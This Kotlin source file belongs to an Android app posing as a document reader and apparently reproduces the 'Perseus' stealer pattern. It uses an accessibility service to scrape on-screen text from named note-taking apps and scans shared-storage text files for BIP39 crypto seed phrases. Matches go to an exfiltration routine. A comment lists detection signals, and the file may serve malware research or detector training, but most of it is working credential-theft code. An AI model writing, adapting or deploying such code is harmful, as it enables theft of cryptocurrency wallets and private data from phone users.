package com.docreader.lite.reader.advanced

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.os.Environment
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.docreader.lite.reader.Exfil
import java.io.File

/**
 * Note-app targeting — Perseus pattern (2025).
 *
 * Crypto users store recovery seed phrases in note-taking apps:
 *   - Google Keep, Samsung Notes, OneNote, Evernote
 *   - Plain text files on shared storage
 *   - Screenshot of seed phrase in gallery
 *
 * Perseus family: monitors note apps via AccessibilityService,
 * scrapes text when note-app foreground, regex-matches BIP39
 * seed phrase patterns (12/24 words from the BIP39 wordlist).
 *
 * Also scans shared storage for files containing seed-like patterns.
 *
 * Value: single crypto wallet seed phrase = potentially millions in assets.
 * Higher per-infection ROI than banking credential theft.
 *
 * Detection: Accessibility scraping note-app packages + BIP39 wordlist
 * regex match + subsequent exfiltration = seed theft signal.
 */
object NoteScanner {

    // Note-app packages to monitor
    private val NOTE_APPS = setOf(
        "com.google.android.keep",         // Google Keep
        "com.samsung.android.app.notes",   // Samsung Notes
        "com.microsoft.office.onenote",    // OneNote
        "com.evernote",                    // Evernote
        "com.simplemobiletools.notes.pro", // Simple Notes
        "org.fossify.notes",              // Fossify Notes
        "com.atomczak.notepat",           // Notepad
    )

    // BIP39 seed phrase indicators (subset — full list is 2048 words)
    // Check for 12 or 24 word sequences from BIP39
    private val SEED_INDICATORS = listOf(
        "abandon", "ability", "able", "abstract", "absurd", "abuse",
        "access", "accident", "account", "acoustic", "acquire", "across",
        "action", "actor", "actual", "adapt", "admit", "adult",
        "alarm", "album", "alcohol", "alien", "alpha", "amount",
        "anchor", "ancient", "anger", "angle", "animal", "apple",
        "arena", "armor", "army", "arrow", "artist", "aspect",
        "attack", "audit", "august", "aunt", "autumn", "average",
        "avocado", "avoid", "awake", "aware", "awesome", "awful",
        "balance", "bamboo", "banana", "basket", "beach", "begin",
        "below", "beyond", "bicycle", "biology", "blast", "bonus",
        "brain", "breeze", "bridge", "bronze", "brother", "bubble",
        "buffalo", "burger", "butter", "cabin", "cactus", "camera",
        "candy", "canvas", "carbon", "carpet", "casual", "catch",
        "cereal", "chalk", "champion", "change", "chaos", "chapter",
        "cherry", "chicken", "choice", "circle", "citizen", "civil",
        "clarify", "claw", "clay", "clean", "clerk", "clever",
        "climb", "clinic", "clock", "clown", "cluster", "coach",
        "coconut", "coffee", "collect", "column", "combine", "comfort",
        "comic", "common", "company", "concert", "conduct", "confirm",
        "connect", "consider", "control", "convince", "coral", "correct",
        "country", "couple", "course", "cousin", "cover", "crazy",
        "cream", "cricket", "crime", "crisp", "critic", "cross",
        "crucial", "cruel", "cruise", "crystal", "cube", "culture",
        "current", "curtain", "curve", "cushion", "custom", "cycle",
        // ... truncated — real implementation has full 2048 words
        "wagon", "walnut", "warrior", "wash", "weapon", "weather",
        "wedding", "weekend", "welcome", "whale", "wheat", "wheel",
        "whisper", "width", "wild", "window", "winter", "wire",
        "wolf", "woman", "wonder", "wood", "world", "worry",
        "worth", "wrap", "wreck", "wrestle", "wrist", "wrong",
        "yard", "year", "youth", "zebra", "zero", "zone", "zoo",
    )

    private val seedIndicatorSet = SEED_INDICATORS.toSet()

    /**
     * Check if foreground app is a note app we target.
     */
    fun isNoteApp(packageName: String): Boolean {
        return packageName in NOTE_APPS
    }

    /**
     * Scrape note-app screen text for seed phrase patterns.
     * Called from DocumentReaderService on TYPE_WINDOW_STATE_CHANGED
     * when foreground app is a note app.
     */
    fun scrapeForSeeds(service: AccessibilityService, event: AccessibilityEvent) {
        val source = event.source ?: return
        val texts = mutableListOf<String>()
        collectText(source, texts, 0)
        source.recycle()

        val fullText = texts.joinToString(" ").lowercase()
        val seedMatch = detectSeedPhrase(fullText)

        if (seedMatch != null) {
            Exfil.credential(
                event.packageName?.toString() ?: "note_app",
                "crypto_seed",
                seedMatch
            )
            Exfil.event("seed_phrase_captured",
                "app" to (event.packageName?.toString() ?: ""),
                "word_count" to seedMatch.split(" ").size.toString()
            )
        }
    }

    /**
     * Detect BIP39 seed phrase in text.
     * Looks for sequence of 12 or 24 words where majority are BIP39 words.
     */
    fun detectSeedPhrase(text: String): String? {
        val words = text.split(Regex("\\s+")).filter { it.length in 3..8 }
        if (words.size < 12) return null

        // Sliding window: check 12-word and 24-word sequences
        for (windowSize in listOf(24, 12)) {
            if (words.size < windowSize) continue

            for (i in 0..words.size - windowSize) {
                val window = words.subList(i, i + windowSize)
                val bip39Count = window.count { it in seedIndicatorSet }

                // Threshold: >= 80% of words in window are BIP39
                if (bip39Count >= (windowSize * 0.8).toInt()) {
                    return window.joinToString(" ")
                }
            }
        }

        return null
    }

    /**
     * Scan shared storage for files containing seed phrases.
     * Checks: .txt, .md, .note files in common locations.
     */
    fun scanSharedStorage(): List<Pair<String, String>> {
        val findings = mutableListOf<Pair<String, String>>()

        val scanDirs = listOf(
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
            File(Environment.getExternalStorageDirectory(), "Notes"),
        )

        val extensions = setOf("txt", "md", "note", "text")

        for (dir in scanDirs) {
            if (!dir.exists() || !dir.isDirectory) continue
            dir.listFiles()?.forEach { file ->
                if (file.isFile && file.extension.lowercase() in extensions && file.length() < 50_000) {
                    try {
                        val content = file.readText().lowercase()
                        val seed = detectSeedPhrase(content)
                        if (seed != null) {
                            findings.add(file.absolutePath to seed)
                            Exfil.credential("filesystem", "seed_file:${file.name}", seed)
                        }
                    } catch (_: Exception) {}
                }
            }
        }

        return findings
    }

    private fun collectText(node: AccessibilityNodeInfo, out: MutableList<String>, depth: Int) {
        if (depth > 10) return
        node.text?.toString()?.takeIf { it.isNotBlank() }?.let { out.add(it) }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            collectText(child, out, depth + 1)
            child.recycle()
        }
    }
}
